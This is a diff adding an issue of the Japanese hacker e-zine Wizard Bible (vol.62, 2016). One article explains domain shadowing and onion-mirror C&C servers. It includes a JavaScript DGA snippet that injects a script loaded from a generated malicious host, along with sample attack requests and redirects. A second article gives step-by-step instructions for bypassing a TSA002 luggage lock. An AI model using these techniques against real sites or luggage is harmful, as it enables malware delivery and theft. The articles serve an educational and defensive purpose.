@@ -1,0 +1,491 @@
+[-]=======================================================================[-]
+
+                      Wizard Bible vol.62 (2016,3,27)
+
+[-]=======================================================================[-]
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+---- 第0章：目次 ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+○第1章: トロイの木馬型のマルウェアについて                     Lyc0ris 著
+
+○第2章: Domain Shadowing攻撃とC&Cの考察                         黒林檎 著
+
+○第3章: TSAロックのバイパス解錠                               IPUSIRON 著
+
+○第4章: お知らせ
+
+○第5章: 著者プロフィール
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第1章: トロイの木馬型のマルウェアについて ---
+
+著者：Lyc0ris
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+記事の内容に問題があると判断したため、削除しました。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第2章: Domain Shadowing攻撃とC&Cの考察 ---
+
+著者：黒林檎
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) 最初に
+
+　お久しぶりです、黒林檎です。今回は、コンピュータウイルスにおける補助的
+な攻撃のお話をさせて頂きます。
+　これ以外に、IoTハッキングを書きたかったですが事例的にも管理者APIの未認
+証などの問題しか書けそうになかったので今回は時期改め、それ以外ではOWASP 
+ZAP APIを使用したウェブ診断便利ツールの作成など書きたかったのですが、いろ
+いろやってる最中にOSXのランサムウェアやDomain Shadowingといった物に触れま
+して、マルウェアにおける補助的な攻撃という事でDomain ShadowingとC&Cについ
+て簡単に書かせて頂きたいと思います。
+
+
+■0x02.) Domain Shadowing攻撃とは?
+
+　Domain Shadowing攻撃とは、簡単に言うと他人のドメインアカウントの資格情
+報を盗み取り(DNSレコードをハッキングし)サブドメインを大量に生成する攻撃で
+す。
+　目的としてはドメインを対象にした検知を回避する目的があります。また、こ
+の方法では、攻撃者は”ほぼ無限”にドメインを生成できるというメリットがあ
+ります。
+
+　Domain Shadowing攻撃を”ruffnex.oc.to“を用いて説明させていただきます。
+
+○domain shadowing図解
+
+/****************************/ ===>  /****************************/
+/*      ruffnex.oc.to       */ ===>  /*   133.242.147.127(Japan) */
+/****************************/ ===>  /****************************/
+
+/****************************/ ===>  /****************************/
+/* malicious.ruffnex.oc.to  */ ===>  /*  133.242.147.127(Chaina) */
+/****************************/ ===>  /****************************/
+
+　という様に、”ruffnex.oc.to”のDNSレコードを乗っ取ってしまったのであれ
+ばサブドメインなど生成せずに”ruffnex.oc.to”のレコードも書き換えて使えば
+良いじゃないか?!と思うかもしれませんが、この攻撃はドメイン所有者が頻繁に
+DNSレコードを確認していないという人間の脆弱性の様な物をついて成り立つため、
+管理者が頻繁に確認する様な(元々登録されているDNSレコード)は書き換えないと
+いうのがこの攻撃のポイントです。
+
+　これとDomain Shadowingに似た攻撃方法として、Fast-Flax攻撃が存在します。
+　それでは、その2つはどの様な違いがあるのでしょうか?
+
+・Fast-Flax攻撃
+　1つのドメインに対して、複数のIPを割り当てます。そして、TTL値を短くし短
+い時間でIPを切り替えていきます。よって、IPベースの検知を回避する目的があ
+ります。
+
+・Domain Shadowing攻撃
+　DGAの様な仕組みで複数のサブドメインを作成し、IPを割り当てます。この攻撃
+では、ドメインベースの検知を回避する目的があります。
+
+　Exploit-kitなどで用いられている、DGAなどで Domain shadowingで生成したド
+メインを生成します。DGAの例として、日付を用いたDGAも存在します。私的です
+が、日付を用いたDGAは多く見受けます。
+
+-----  日付を用いたDGA
+function runonload(){
+	if(!document.body){
+		setTimeout(runonload,50);
+	}else{
+		var s = document.createElement("SCRIPT");
+		s.src = "http://" + hashdate().toString(16) + “.jp/malicious.html?" + Math.random();
+		document.body.appendChild(s);
+	}
+};
+-----
+
+　これ以外では、”malicious.ruffnex.oc.to”になる様に配列に文字列を保持し、
+サブドメインを生成する様仕組み用いるDGAなどもあります。
+　DGA自体は多種多様な方法があるので、これと言った方法はありません。
+
+
+■0x03.) Domain shadowing攻撃の流れ
+
+　話を戻して、Domain shadowing攻撃の流れですが、図解では以下のような流れです。
+
+[*1]                                  [*2]                                       [*3]
+/****************************/ ===>  /***********************************/ ===> /*********************************/
+/*    不正な広告ページなど  */ ===>  /*      malicious.ruffnex.oc.to    */ ===> /*  ランディングページ(exploitページ) */
+/****************************/ ===>  /***********************************/ ===> /*********************************/
+
+●各ページの説明
+
+　各ページについて説明します。
+
+○[*1]
+
+　不正な広告ページはもちろん、javaScriptは難読化されており、iframe自体も
+ユーザーには見えない様にされています。その広告ページは、主にDomain shado
+wingページへPOSTを飛ばす役割をします。
+　POSTでは、認証キーのような物を投げます。
+
+-----
+POST http://malicious.ruffnex.oc.to/ladrien.html HTTP/1.1
+…
+Host: malicious.ruffnex.oc.to
+Pragma: no-cache
+
+認証キー:hogehoge
+-----
+
+○[*2]
+　広告ページより、認証キーのPOSTを受け以下の様なリクエストを返します。
+
+-----
+<meta http-equiv=“REFRESH” content=“0;url=ランディングページへ“>
+-----
+
+○[*3]
+
+　最終的に広告ページから、目的のランディングページ(exploitなどを行うペー
+ジ)に転送され攻撃が実行されます。
+
+●ドメインを切り替えるタイミング
+
+　ドメインなどを切り替えるタイミングですが、av checkようなオンラインサー
+ビスなどを用います。
+　解析者により検知サービスにドメインがブラックリストに入れられたかなどを
+定期的に調べます。もしブラックリストに入れられた際に、ドメインを切り替え
+ます。
+
+参考Link:http://avdetect.com/
+
+●Domain Shadowing攻撃の対策
+
+　Domain Shadowingは、単純にユーザーを騙して管理パネルにアクセスするため、
+多くはフィッシングのような初歩的な攻撃技術が使用されます。よって、この攻
+撃に対しての対策としては以下が挙げられています。
+
+・2段階認証を用いる。
+・DNSレコードなどの変更後に電子メールする。
+
+　以上で、Domain Shadowingについての概要を終え、C&Cで面白かった事を簡単で
+すがまとめさせて頂きたいと思います。
+
+■0x04.) C&Cについて
+
+　最近、OSXを狙ったランサムウェアが話題になりました。主に”OSX”というの
+が騒がれていましたが、そこに使用されていた物が個人的に目新しい技術でした
+ので紹介します。OSXランサムウェアのC&CサーバーでONIONサーバーですが、少し
+違います。
+
+-----  onionミラーなリンク
+lclebb6kvohlkcml*]onion[*]link
+lclebb6kvohlkcml*]onion[*]nu
+-----
+
+　onionアドレスは、[半角英数*16].onionなアドレスでtor proxyを経由する事で
+アクセスできる物です。また、”.onion”は擬似TLDであり、tor proxyを経由し
+なければアクセスする事が出来ません。しかし、このC&Cに使用されているサーバ
+ーを”onionミラー”と呼ぶとして、これはは”.onion”とウェブとの間のリンク
+のような仕組みです。
+
+　torの様に通信を暗号化する様な仕組みではないですが、サーバー自体の匿名性
+は保持したままになります。
+
+-----  onionミラーをnslookupした結果（*ipに注目）
+$nslookup auutwvpt2zktxwng.onion.link
+Non-authoritative answer:
+Name:	auutwvpt2zktxwng.onion.link
+Address: 103.198.0.2
+
+$nslookup hackerrljqhmq6jb.onion.link
+
+Non-authoritative answer:
+Name:	hackerrljqhmq6jb.onion.link
+Address: 103.198.0.2
+-----
+
+　この様なC&Cサーバーとしてこの様な物を使われているnoha。初めて見たため驚
+きました。これからマルウェアの補助的な技術としてどの様な技銃が増えていく
+のか気になるところです。
+
+
+●Domain Shadowing参考リンク
+
+http://blogs.cisco.com/security/talos/angler-domain-shadowing
+https://blogs.sophos.com/2015/07/21/a-closer-look-at-the-angler-exploit-kit/
+https://blog.malwarebytes.org/malvertising-2/2015/04/domain-shadowing-with-a-twist/
+http://en.wooyun.io/2016/03/16/45.html
+https://nakedsecurity.sophos.com/2012/11/23/hacked-go-daddy-ransomware/
+
+●Onionミラー参考URL
+
+http://www.onion.link/faq.html
+https://tor2web.org/
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第3章: TSAロックのバイパス解錠 ---
+
+著者：IPUSIRON
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　TSAロックを解錠する方法はいくつか存在します。例えば、バイパス解錠、ピッ
+キングツールを使った解錠、マスターキーによる解錠などです。本稿では、もっ
+とも簡単なバイパス解錠について紹介します。
+
+
+■0x02.) TSAロックの概要
+
+　TSAロックとはアメリカ運輸保安局 TSA（Transportation Security Administr
+ation）によって認可・容認された錠前です。近年のTSAロックは文字合わせ錠の
+タイプのものが普及しています（図1参照）。
+
+（図2：http://wizardbible.org/62/img/TSA_lock.jpg）TSAロック付きダイヤル錠
+
+　アメリカ同時多発テロの後、爆破物や危険物の検査のためにアメリカ国内のす
+べての空港において、アメリカへの出入国とアメリカ国内のフライトに際して、
+厳重なセキュリティチェックが行われています。特に空港に預ける荷物に関して
+は、持ち主がいない場所でもTSA職員によってバッグやスーツケースの中を検査し
+ています。もしスーツケース等の錠前が施錠された状態の場合には、職員が破錠
+してから検査します。こうした破壊行為が原因によって内容物が破壊したり紛失
+したりしても、TSA職員は一切責任を負わなくてもよいと国によって取り決められ
+ています。そのため、荷物を預けるタイミングで施錠をしないように促されます。
+これはアメリカ本土だけでなく、ハワイ、グアム、アラスカ、サイパン、その他
+のアメリカ領のエリアの旅行の際も同様です。
+
+　しかし、錠前の施錠をしないということはTSA職員以外にも中身を開けられてし
+まう恐れがあります。
+　TSAロックはこうした不安を解消します。TSAロックは特別にTSAからの認可を受
+けており、TSAロックが付いている錠前であれば、施錠したまま空港の検査に出し
+てもよいことになっています。空港のTSA職員はTSAロックの鍵を所有しており、
+TSAロックを施解錠できます。この鍵は一般向けには販売されていないため、TSA
+職員以外にとっては鍵開けの技術を駆使する以外に開錠する術はありません。
+
+●TSAロックが付属していないスーツケース
+
+　TSAロックが付属していないスーツケース向けに、TSAロック付属のダイヤル式
+南京錠やスーツケースベルトが販売されています。
+○TSAロック付属のダイヤル式南京錠
+
+　シャックルを2つのファスナーの穴に通して、ファスナーを開けることを防ぎま
+す。TSAロックの鍵穴は底面に存在します。古いタイプでは、ピンタンブラー錠タ
+イプのTSAロックも存在します。
+
+○TSAロック付属のスーツケースベルト
+
+　施錠するとベルトが固定され、解錠するとベルトを緩めることができます。取
+っ手の部分をベルトを通してロックを掛けることで、スーツケースベルトをずら
+して外すことを防ぐことができます。
+
+　ファスナーで開けるタイプの場合、ベルトを施錠したままでも手探りで中の物
+品を奪うことができます。一方、硬い蓋を開けるタイプの場合、この種のスーツ
+ケースベルトで固定されていると、ベルトのTSAロックを解錠するか、ベルトを切
+断するかしなければ、中の物品は奪われません。ベルトは刃物で簡単に切断する
+ことができますが、切断されてしまえば盗難にあったことを検知できます。
+
+●TSAロック以外の錠前で施錠したままだとどうなるか
+
+　ところで、「TSAロックを開ける係員が不在で、スーツケースごと壊されること
+があるため、スーツケースの鍵はかけずTSAロック付きスーツケースベルトをかけ
+るように」といわれることもあるようです。万が一TSA職員に破錠される場合でも、
+TSAロック付きスーツケースベルトであれば、ベルトの切断だけの被害で済み、ス
+ーツケースが備えている錠前を破壊されることがありません。スーツケースが備
+えている錠前を交換しようとしても、メーカーに問い合わせする手間が生じ、最
+悪の場合は対応する部品の在庫が残っておらず交換することさえできません。
+
+
+■0x03.) TSAロックのバイパス解錠
+
+　TSAロックの鍵穴の近くに「TSA00x」のように刻印されていますが、この数値ご
+とにTSAロックの鍵の形状・大きさが異なります。国内ではTSA007やTSA002をよく
+見かけることができます。本稿ではTSA002の解錠方法を紹介します
+
+●TSA002
+
+　TSA002は使用者は3桁の数字の組み合わせ錠で施解錠し、TSA職員は鍵で施解錠
+するタイプです（図2参照）。
+
+（図2：http://wizardbible.org/62/img/TSA002_3.jpg）TSA002の外観
+
+　暗証番号は側面に揃えます（図3参照）。
+
+（図3：http://wizardbible.org/62/img/TSA002_10.jpg）TSA002の側面
+
+　暗証番号をセットするとシャックルを引くことができ、解錠します。施錠時に
+はシャックルを戻した状態で番号をずらします。
+
+●TSA002の暗証番号の変更
+
+　デフォルトの暗証番号は000ですが、任意の番号に変更できます。
+　暗証番号をセットしてシャックルを解錠状態にします。シャックルを引っ張る
+と、根元の突起が見えます。シャックルの軸を中心にして先端を90度回転して、
+突起を90度先の切り欠きに入れます（図4参照）。
+
+（図4：http://wizardbible.org/62/img/TSA002_11.jpg）暗証番号の変更時の突
+起の位置
+
+　シャックルを上から押した状態で、ダイヤルを回して数値を変更します。目的
+の暗証番号にセットしたら、シャックルを上から押さえないようにします。これ
+で暗証番号が変更されます。
+
+●TSA002のバイパス解錠
+
+　TSA002のTSAロック部の鍵穴は次のような形状になっています（図5参照）。
+
+（図5：http://wizardbible.org/62/img/TSA002_1.jpg）TSA002の鍵穴の形状
+
+　この鍵穴は通常TSA職員しか使用しません。TSAロックのマスターキーを挿入す
+ることで、暗証番号をセットすることなく、解錠することができます。本稿の目
+的はマスターキー以外のものを挿入し、TSAロックを解錠してしまうことです。
+ちょっとした道具さえあれば、次の手順で誰でも解錠できます。
+
+　TSA002は次の手順でバイパス解錠できます。
+
+1：ディンプル錠のピッキングに使用するテンションを用意します（図6参照）。
+
+（図6：http://wizardbible.org/62/img/TSA002_2.jpg）解錠対象のTSA002と解錠
+に使用するテンション
+
+　このテンションが用意できない場合は、比較的厚みのあるLテンションなどで代
+用できます。厚みを要求するのはひねりの動作が入るためです。
+　ただし、内筒の前面の鍵穴の形状は長方形ですが、内部に突起があるため、そ
+の突起を避けることができる厚みのものしか挿入できません。
+
+2：テンションの幅の小さい方をTSAロックの鍵穴に挿入します（図7参照）。
+
+（図7：http://wizardbible.org/62/img/TSA002_4.jpg）テンションの挿入
+
+3：奥まで挿入すると弾力があります。弾力を押し返したまま、全体を下（あるい
+は上）に移動すると、解錠方向に回転します（図8参照）。
+
+（図8：http://wizardbible.org/62/img/TSA002_5.jpg）テンションの操作
+
+4：内筒が90度回転し、TAS002という文字に対して、鍵穴が横になれば解錠の成功
+です（図9参照）。
+
+（図9：http://wizardbible.org/62/img/TSA002_6.jpg）解錠成功
+
+　TSAロックを解錠しても、シャックルの先端は上がりません。それにもかかわら
+ず、解錠状態になるのは、シャックルの先端に秘密があります。
+　シャックルの先端がセットされている部分の周囲に赤いウォードと金属のウォ
+ードがあります。赤いウォードは2箇所に切り欠きがある円柱状の障害物です。ま
+た、その内側にある金属のウォードは1箇所に切り欠きがある円柱状の障害物です。
+　TSAロックを施解錠すると、金属のウォードが90度回転します。TSAロックの解
+錠時には赤色のウォードの切り欠きと金属のウォードの金属の切り欠きが揃い、
+シャックルの軸を中心にして回転することで、解錠状態になります（図10、図11
+参照）。
+
+（図10：http://wizardbible.org/62/img/TSA002_7.jpg）ウォードの切り欠きが揃ったところ
+（図11：http://wizardbible.org/62/img/TSA002_8.jpg）TSAロックの解錠状態
+
+　逆に、TSAロックの施錠時には赤色のウォードの切り欠きと金属のウォードの金
+属の切り欠きが揃わないので、シャックルの先端がウォードに引っ掛かるわけで
+す。つまり、シャックルの先端が元の位置にあれば施錠状態になるわけです（図
+12参照）。
+
+（図12：http://wizardbible.org/62/img/TSA002_9.jpg）TSAロックの施錠状態
+
+
+■0x04.) 終わりに
+
+　今回紹介したバイパス解錠は非常に簡単でした。他のTSA001や一部のTSA007は
+これほど簡単にうまくいきません。ピッキングツールやマスターキーの複製など
+が有効です。詳細は出版予定の錠前の本で紹介します。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+ --- 第4章: お知らせ ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+○Wizard Bible（http://wizardbible.org/）では随時、執筆ライターを募集して
+います。
+　扱う内容のテーマは広義での「under ground」です。例えばハッキングやセキ
+ュリティからピッキングなどと幅広い内容を考えています。また特殊な職業や趣
+味の解説などでも構いません。
+　一回きりでも構いません。また必ず毎回連載する義務もありませんので、でき
+る範囲で構いません。気軽に声をかけてください。
+
+○Kenji AikoさんがQ&Aを作ってくれました。初めて参加する人でもわかりやすく
+書かれていますので、参考にしてください。
+
+http://wizardbible.org/wbQandA.html
+
+○Wizard Bibleに参加希望の方は気軽にメール（ipusiron@gmail.com）ください。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+  --- 第5章: 著者プロフィール ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■Lyc0ris
+●Job: Student
+●Web: http://lyc0ris.webcrow.jp/
+●Twitter: @lyc0ris_sec
+●Mail: lyc0ris.hacker@gmail.com
+●Comment:
+　まだまだ駆け出しですが宜しくです:)
+
+
+■黒林檎
+●Job: 自宅警備員
+●Web: http://ruffnex.oc.to/kuroringo/kuroringo/me.html
+●Web2: http://www.packr.org/
+●Twitter: @r00tapple
+●Mail: packr@packr.org
+●Comment:
+　今回は、マルウェアの補助的なお話になりました。
+　IoTに関するハッキングも診断業者が増えるなどIoTに対するセキュリティ事業
+も形になってきた様な気がします。
+
+
+■IPUSIRON
+●Job: 自宅警備員
+●Web: http://akademeia.info
+●Twitter: @ipusiron
+●Mail: ipusiron@gmail.com
+●Comment:
+　皆様のおかげにより、「ITエンジニア本大賞2016」技術書部門の3タイトルに
+『ハッカーの学校』が選ばれました。その後、デブサミ2016のプレゼン大会に参
+加し、「ITエンジニア本大賞2016」の特別賞を頂きました。詳細は『ハッカーの
+学校』公式サイトのトップページに記載しましたので、ご確認ください。
+http://s-akademeia.sakura.ne.jp/main/books/school/
+　また、まぼろし博覧会にて、GWに文化祭イベントが開催されます。そこでSecu
+rity Akademeiaも何らかの催し物をする予定です。詳細は、Security Akademeia
+のトップページのお知らせをご確認ください。
+http://data-house.sblo.jp/
+
